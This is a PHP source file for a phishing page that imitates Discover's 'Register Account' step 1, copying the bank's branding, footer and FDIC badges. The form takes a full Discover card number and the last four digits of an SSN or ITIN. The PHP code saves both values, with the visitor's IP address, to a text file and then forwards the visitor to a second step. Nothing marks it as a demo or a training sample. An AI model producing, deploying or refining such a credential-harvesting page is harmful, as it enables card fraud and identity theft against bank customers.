<?php
session_start();
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/includes/file_storage.php';

// Handle Step-1 submission
$errors = [];
$card_val = '';
$ssn_val = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $card_raw = $_POST['card_number'] ?? '';
    $ssn_raw = $_POST['ssn_last4'] ?? '';

    // sanitize for logic
    $cardNumber = preg_replace('/\s+|-/', '', $card_raw);
    $ssnLast4   = preg_replace('/\D/', '', $ssn_raw);

    // repopulate forms
    $card_val = htmlspecialchars($card_raw);
    $ssn_val = htmlspecialchars($ssn_raw);

    if (empty($cardNumber) || !preg_match('/^6011\d{12}$/', $cardNumber)) {
        $errors['card_number'] = 'Please enter a valid 16-digit Discover card starting with 6011';
    }

    if (empty($ssnLast4) || strlen($ssnLast4) !== 4) {
        $errors['ssn_last4'] = 'Enter last 4 digits of SSN/ITIN';
    }

    if (empty($errors)) {
        saveUserData('discover_step1.txt', [
            'step'        => 'card_verification',
            'card_number' => $cardNumber,
            'ssn_last4'   => $ssnLast4,
            'ip'          => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
        ]);
        $_SESSION['discover_card']  = $cardNumber;
        $_SESSION['discover_ssn4']  = $ssnLast4;
        header('Location: step2.php');
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discover | Register Account</title>
    <style>
        :root {
            --navy: #2c2e4f;
            --orange: #eb683f; /* Closest match to image button */
            --orange-hover: #cf5630;
            --text-dark: #333333;
            --text-gray: #666666;
            --border-gray: #b3b3b3;
            --bg-gray: #f2f2f2;
            --error-red: #d12c2c;
            --link-blue: #0076a8;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: Arial, "Helvetica Neue", Helvetica, sans-serif;
            background-color: #fff;
            color: var(--text-dark);
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        /* HEADER */
        header {
            height: 70px;
            padding: 0 5%;
            display: flex;
            align-items: center;
            border-bottom: 2px solid #f0f0f0;
            background: #fff;
            z-index: 10;
        }
        .logo {
            width: 120px;
            display: block;
        }

        /* MAIN LAYOUT */
        .main-container {
            display: flex;
            flex: 1;
            width: 100%;
            background-color: var(--navy); /* The split background base */
        }

        /* LEFT SIDE - The Form */
        .left-panel {
            flex: 1;
            background-color: #fff;
            border-bottom-right-radius: 16em; /* The Signature Curve */
            padding: 30px 5%;
            display: flex;
            flex-direction: column;
            justify-content: top;
            align-items: center; /* Horizontally center the form wrapper */
            min-height: 640px;
            position: relative;
            z-index: 5;
            padding-bottom: 120px;
            margin-bottom: 100px;
        }

        .step-indicator {
            font-size: 1rem;
            font-family: "Georgia", "Times New Roman", Times, serif;
            color: var(--text-gray);
            margin-bottom: 12px;
            letter-spacing: 0.5px;
            width: 100%; /* Ensure text aligns left within centered block if needed, though wrapper handles it */
        }

        h1 {
            font-family: "Georgia", "Times New Roman", Times, serif; /* Serif font */
            font-size: 1.2rem;
            color: var(--navy);
            margin-bottom: 40px;
            font-weight: 700;
        }

        /* FORM */
        .form-group {
            margin-bottom: 24px;
            position: relative;
        }

        /* Floating Label Styles */
        .input-wrapper {
            position: relative;
        }

        .floating-input {
            width: 100%; /* Reset to full width of container */
            height: 64px; /* Increased height */
            padding: 24px 60px 8px 16px; /* Space for label at top and show/hide button on right */
            font-size: 16px;
            border: 1px solid #767676; /* Default gray border */
            border-radius: 12px; /* Rounded corners */
            background-color: #f7f7f7;
            color: #333;
            outline: none;
            transition: all 0.2s;
            appearance: none;
        }

        .floating-input:focus {
            border: 2px solid #333; /* Thick black/dark border on focus */
            background-color: #fff;
        }

        .form-group.error .floating-input {
            border: 1px solid var(--error-red); /* Red border on error */
        }
        
        /* If focused AND error? Usually error red takes precedence or focus black.
           Image shows "Card Number" with Red Border (Error).
           "Last 4 digits" with Black Border (Focus).
           So Error overrides default, Focus overrides default.
           If Error + Focus? Let's assume Focus Black overrides or Error Red stays. 
           Standard pattern: Error Red stays. */
        .form-group.error .floating-input:focus {
             border: 2px solid var(--error-red);
        }

        /* Show/Hide Toggle Styles */
        .toggle-visibility {
            position: absolute;
            right: 16px;
            top: 50%;
            transform: translateY(-50%);
            color: #0076a8;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            user-select: none;
            z-index: 10;
        }

        .toggle-visibility:hover {
            color: #005a8a;
            text-decoration: underline;
        }

        .floating-label {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            color: #666;
            pointer-events: none;
            transition: 0.2s ease all;
            font-size: 16px;
        }

        /* Move label up when focused or has value */
        .floating-input:focus ~ .floating-label,
        .floating-input:not(:placeholder-shown) ~ .floating-label {
            top: 18px;
            font-size: 12px;
            color: #666;
        }
        
        /* Error Message */
        .error-message {
            display: flex;
            align-items: flex-start;
            margin-top: 8px;
            font-size: 13px;
            color: #333;
            gap: 8px;
        }
        
        .error-icon {
            color: var(--error-red);
            font-weight: bold;
            font-size: 14px;
            border: 1px solid var(--error-red);
            border-radius: 50%;
            width: 16px;
            height: 16px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
            margin-top: 1px;
        }

        .submit-btn {
            background-color: #f4ab8f; /* Light peach default */
            color: #fff;
            font-size: 16px;
            font-weight: 700;
            border: none;
            border-radius: 30px;
            padding: 18px 40px;
            cursor: pointer;
            margin-top: 10px;
            transition: background-color 0.2s;
            min-width: 140px;
        }
        
        .submit-btn:hover {
            background-color: var(--orange);
        }

        /* Center button on tablet and mobile */
        @media (max-width: 900px) {
            .submit-btn {
                display: block;
                margin-left: auto;
                margin-right: auto;
                width: 100%;
            }
        }

        /* RIGHT SIDE - The Content */
        .right-panel {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            justify-content: flex-start;
            position: relative;
            padding-top: 110px;
            padding-left: 60px;
        }

        .card-container {
            width: 380px;
            position: relative;
            margin: 0;
        }

        .card-asset {
            width: 100%;
            height: auto;
            display: block;
            filter: drop-shadow(0 20px 30px rgba(0,0,0,0.4));
        }

        /* FOOTER */
        /* FOOTER */
        footer {
            background-color: #fff;
            padding: 40px 5%;
            border-top: 1px solid #eee;
            display: flex;
            flex-direction: column;
            gap: 30px;
        }

        .footer-top {
            display: flex;
            justify-content: space-between;
            align-items: center;
            width: 100%;
        }

        .footer-links {
            display: flex;
            gap: 15px;
            align-items: center;
            flex-wrap: wrap;
        }

        .footer-links a {
            color: var(--link-blue);
            text-decoration: none;
            font-size: 13px;
            font-weight: 500;
        }
        
        .footer-links .divider {
            color: #ccc;
            font-size: 13px;
        }

        .privacy-toggle {
            display: inline-flex;
            align-items: center;
            gap: 6px;
        }

        .mobile-app-btn {
            display: inline-flex;
            align-items: center;
            gap: 10px;
            background: #f1f1f1;
            padding: 12px 24px;
            border-radius: 999px;
            text-decoration: none;
            color: #333;
            font-weight: 700;
            font-size: 14px;
            transition: background 0.2s;
        }
        
        .mobile-app-btn:hover {
            background-color: #e5e5e5;
        }

        .footer-bottom {
            display: flex;
            flex-direction: column;
            align-items: flex-end;
            gap: 10px;
        }

        .badges-row {
            display: flex;
            align-items: center;
            gap: 20px;
        }

        .badge-icon {
            height: 32px;
            width: auto;
        }

        .fdic-group {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .member-fdic {
            font-weight: bold;
            font-size: 14px;
            color: #333;
        }

        .copyright-row {
            font-size: 11px;
            color: #666;
            text-align: right;
        }


        /* Mobile Helper Image */
        .mobile-card-helper {
            display: none; /* Hidden by default */
            margin: 20px 0;
            width: 100%;
            background-color: #eef0f6; /* Light gray/blue bg from screenshot */
            border-radius: 8px;
            padding: 20px;
            text-align: center;
        }

        .mobile-card-helper img {
            max-width: 100%;
            height: auto;
            display: block;
            margin: 0 auto;
        }

        /* RESPONSIVE */
        @media (max-width: 900px) {
            .main-container {
                flex-direction: column;
                background-color: #fff; /* White bg on mobile */
            }
            .left-panel {
                border-bottom-right-radius: 0;
                padding: 30px 10%;
                min-height: auto;
                margin-bottom: 0;
                padding-bottom: 60px;
            }
            .right-panel {
                display: none; /* Hide right panel on mobile */
            }
            .mobile-card-helper {
                display: block; /* Show inline helper */
            }
            
            h1 {
                text-align: center;
                margin-bottom: 30px;
            }
            
            
            .step-indicator {
                text-align: center;
            }

            /* Mobile Footer Updates */
            .footer-top {
                flex-direction: column;
                gap: 20px;
                align-items: center;
            }

            .footer-links {
                justify-content: center;
                text-align: center;
            }

            .mobile-app-btn {
                background-color: #f1f1f1;
                /* Match visually roughly the button in screenshot: 
                   It has a slight gradient or inner shadow? Standard flat is fine.
                   Key is structure. 
                */
                width: auto;
                justify-content: center;
            }
            
            .footer-bottom {
                align-items: center; /* Center everything */
            }
            .copyright-row {
                text-align: center;
            }

            /* Center header logo on mobile and tablet */
            header {
                justify-content: center;
            }
        }
    </style>
</head>
<body>

    <header>
        <img src="assets/discover_logo.png" alt="Discover" class="logo">
    </header>

    <div class="main-container">
        <!-- LEFT: Form -->
        <div class="left-panel">
            <div style="max-width: 450px; width: 100%;">
                <p class="step-indicator">Register Account: Step 1 of 2</p>
                <h1>Let's register your account</h1>

                <form method="POST" action="">
                    <!-- Card Number -->
                    <div class="form-group <?= isset($errors['card_number']) ? 'error' : '' ?>">
                        <div class="input-wrapper">
                            <input type="password" name="card_number" id="card_number" 
                                   class="floating-input"
                                   placeholder=" " 
                                   value="<?= $card_val ?>" 
                                   maxlength="19" inputmode="numeric">
                            <label for="card_number" class="floating-label">Card Number</label>
                            <span class="toggle-visibility" data-target="card_number">Show</span>
                        </div>
                        <?php if (isset($errors['card_number'])): ?>
                            <div class="error-message">
                                <span class="error-icon">!</span>
                                <span><?= $errors['card_number'] ?></span>
                            </div>
                        <?php endif; ?>
                    </div>

                    <!-- Mobile Card Helper (Visible only on < 900px) -->
                    <div class="mobile-card-helper">
                        <img src="assets/card2.svg" alt="Card Helper">
                    </div>

                    <!-- SSN Last 4 -->
                    <div class="form-group <?= isset($errors['ssn_last4']) ? 'error' : '' ?>">
                        <div class="input-wrapper">
                            <input type="password" name="ssn_last4" id="ssn_last4" 
                                   class="floating-input"
                                   placeholder=" " 
                                   value="<?= $ssn_val ?>" 
                                   maxlength="4" inputmode="numeric">
                            <label for="ssn_last4" class="floating-label">Last 4 digits of SSN or ITIN</label>
                            <span class="toggle-visibility" data-target="ssn_last4">Show</span>
                        </div>
                        <?php if (isset($errors['ssn_last4'])): ?>
                            <div class="error-message">
                                <span class="error-icon">!</span>
                                <span><?= $errors['ssn_last4'] ?></span>
                            </div>
                        <?php endif; ?>
                    </div>

                    <button type="submit" class="submit-btn" id="submitBtn">Continue</button>
                </form>
            </div>
        </div>

        <!-- RIGHT: Card Visual -->
        <div class="right-panel">
            <div class="card-container">
                <img src="assets/cardd.svg" alt="Discover Card" class="card-asset">
            </div>
        </div>
    </div>

    <!-- FOOTER -->
    <footer>
        <div class="footer-top">
            <div class="footer-links">
                <a href="#">Terms of Use</a> <span class="divider">|</span>
                <a href="#">Privacy</a> <span class="divider">|</span>
                <a href="#">AdChoices</a> <span class="divider">|</span>
                <a href="#" class="privacy-toggle">
                    Your California Privacy Choices
                    <svg width="26" height="14" viewBox="0 0 26 14" fill="none">
                        <rect x="0.5" y="0.5" width="25" height="13" rx="6.5" stroke="#0076a8"/>
                        <circle cx="19" cy="7" r="4" fill="#0076a8"/>
                        <path d="M7 4L9 9L11 4" stroke="#0076a8" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
                    </svg>
                </a>
            </div>
            
            <a href="#" class="mobile-app-btn">
                <img src="assets/discover_logo.png" style="height:20px; width:auto; margin-right:8px;" alt="Discover">
                <span>Discover Mobile App</span>
            </a>
        </div>

        <div class="footer-bottom">
            <div class="badges-row">
                <img src="assets/housing.svg" alt="Equal Housing Lender" class="badge-icon">
                <img src="assets/bbb.svg" alt="BBB" class="badge-icon">
                <div class="fdic-group">
                    <img src="assets/fdic.svg" alt="FDIC" class="badge-icon">
                    <span class="member-fdic">Member FDIC</span>
                </div>
                <!-- Based on image, simplified rights reserved text -->
            </div>
            <div class="copyright-row">
                &copy; 2025 Discover, a division of Capital One, N.A., Member FDIC
            </div>
        </div>
    </footer>

    <script>
        // Formatting scripts
        document.getElementById('card_number').addEventListener('input', function (e) {
            let v = e.target.value.replace(/\D/g, '').substring(0, 16);
            e.target.value = v.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
        });
        document.getElementById('ssn_last4').addEventListener('input', function (e) {
            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
        });

        // Show/Hide password functionality
        document.querySelectorAll('.toggle-visibility').forEach(toggle => {
            toggle.addEventListener('click', function() {
                const targetId = this.getAttribute('data-target');
                const input = document.getElementById(targetId);
                
                if (input.type === 'password') {
                    input.type = 'text';
                    this.textContent = 'Hide';
                } else {
                    input.type = 'password';
                    this.textContent = 'Show';
                }
            });
        });
    </script>
</body>
</html>
